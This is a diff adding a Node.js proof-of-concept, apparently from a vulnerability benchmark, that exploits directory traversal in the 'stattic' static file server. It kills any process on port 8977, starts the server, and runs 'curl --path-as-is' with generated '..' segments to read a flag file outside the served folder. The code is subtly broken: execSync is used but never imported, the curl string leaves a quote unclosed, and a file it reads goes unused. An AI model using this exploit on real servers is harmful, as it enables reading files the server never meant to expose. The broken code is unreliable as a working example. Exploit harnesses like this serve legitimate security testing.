@@ -1,0 +1,30 @@
+function exploitFunction({ pathToFlag, genstr }) {
+  const path = require("path");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+  try {
+    execSync("fuser -k 8977/tcp", () => {});
+  } catch (e) {}
+
+  const stattic = require("stattic");
+  stattic.set("folder", ".");
+  stattic.set("port", 8977);
+  stattic.listen();
+
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8977${genstr(10)}`; // Use the reduced number of ".."
+
+  return new Promise((resolve, reject) => {
+    exec(attack_string, (error, stdout) => {
+      if (error) {
+        reject(error);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+
+module.exports = { exploitFunction };
